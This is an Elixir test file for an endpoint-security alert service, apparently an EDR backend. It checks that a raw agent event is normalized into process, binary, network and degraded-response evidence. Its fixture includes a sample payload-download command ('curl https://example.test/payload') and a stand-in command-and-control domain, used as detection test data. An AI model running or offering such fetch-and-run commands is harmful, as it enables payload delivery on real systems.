defmodule TamanduaServer.Alerts.EndpointEvidenceTest do
  use TamanduaServer.DataCase, async: false

  alias TamanduaServer.Alerts

  test "create_alert fills endpoint process binary network and degraded capability evidence" do
    org = insert(:organization)

    {:ok, alert} =
      Alerts.create_alert(%{
        organization_id: org.id,
        title: "Agent detection: suspicious network process",
        description: "Sparse agent event should be normalized for triage",
        severity: "high",
        raw_event: %{
          "pid" => 4321,
          "process_name" => "curl",
          "command_line" => "curl https://example.test/payload",
          "parent_pid" => 100,
          "parent_process_name" => "bash",
          "path" => "/usr/bin/curl",
          "sha256" => "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
          "remote_ip" => "203.0.113.10",
          "remote_port" => 443,
          "protocol" => "tcp",
          "network_pivots" => [
            %{
              "remote_ip" => "198.51.100.20",
              "remote_port" => 8443,
              "domain" => "c2.example.test",
              "protocol" => "tcp"
            }
          ],
          "process_tree" => [
            %{"pid" => 1, "name" => "systemd", "path" => "/usr/lib/systemd/systemd"},
            %{"pid" => 100, "name" => "bash", "command_line" => "bash -c curl"},
            %{
              "pid" => 4321,
              "name" => "curl",
              "path" => "/usr/bin/curl",
              "sha1" => "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
              "sha256" => "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            }
          ],
          "response_audit" => %{
            "schema_version" => "tamandua.command_response_audit/v1",
            "command_id" => "cmd-123",
            "command_type" => "block_ip",
            "result_status" => "degraded",
            "delivery_audit" => %{
              "schema_version" => "tamandua.command_delivery_audit/v1",
              "command_id" => "cmd-123",
              "command_type" => "block_ip",
              "received_at_ms" => 1_234,
              "completed_at_ms" => 1_567,
              "result_status" => "degraded"
            },
            "capability" => %{
              "status" => "degraded",
              "degraded" => true,
              "degraded_reason" => "network_owner_lookup_unavailable",
              "platform" => "linux",
              "arch" => "x86_64"
            }
          },
          "degraded" => true,
          "degraded_reason" => "network_owner_lookup_unavailable",
          "platform" => "linux"
        },
        evidence: %{}
      })

    assert evidence_get(alert.evidence, [:process, :pid]) == 4321
    assert evidence_get(alert.evidence, [:process, :name]) == "curl"
    assert evidence_get(alert.evidence, [:binary, :path]) == "/usr/bin/curl"
    assert evidence_get(alert.evidence, [:binary, :sha256]) ==
             "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

    assert [network | _] = evidence_get(alert.evidence, [:network])
    assert evidence_get(network, [:remote_ip]) == "203.0.113.10"
    assert evidence_get(network, [:remote_port]) == 443
    assert evidence_get(network, [:protocol]) == "tcp"
    assert Enum.any?(evidence_get(alert.evidence, [:network]), fn pivot ->
             evidence_get(pivot, [:remote_ip]) == "198.51.100.20" and
               evidence_get(pivot, [:domain]) == "c2.example.test"
           end)

    assert evidence_get(alert.evidence, [:endpoint_capability, :degraded]) == true
    assert evidence_get(alert.evidence, [:endpoint_capability, :degraded_reason]) ==
             "network_owner_lookup_unavailable"
    assert evidence_get(alert.evidence, [:endpoint_capability, :arch]) == "x86_64"

    assert evidence_get(alert.evidence, [:response_delivery_audit, :command_id]) == "cmd-123"
    assert evidence_get(alert.evidence, [:response_delivery_audit, :result_status]) == "degraded"
    assert evidence_get(alert.evidence, [:response_delivery_audit, :completed_at_ms]) == 1_567

    assert Enum.map(alert.process_chain, &evidence_get(&1, [:name])) == ["systemd", "bash", "curl"]
    assert Enum.any?(alert.process_chain, fn entry ->
             evidence_get(entry, [:name]) == "curl" and
               evidence_get(entry, [:sha256]) ==
                 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
           end)
  end

  defp evidence_get(value, []), do: value

  defp evidence_get(map, [key | rest]) when is_map(map) do
    evidence_get(map[key] || map[to_string(key)], rest)
  end

  defp evidence_get(_value, _path), do: nil
end
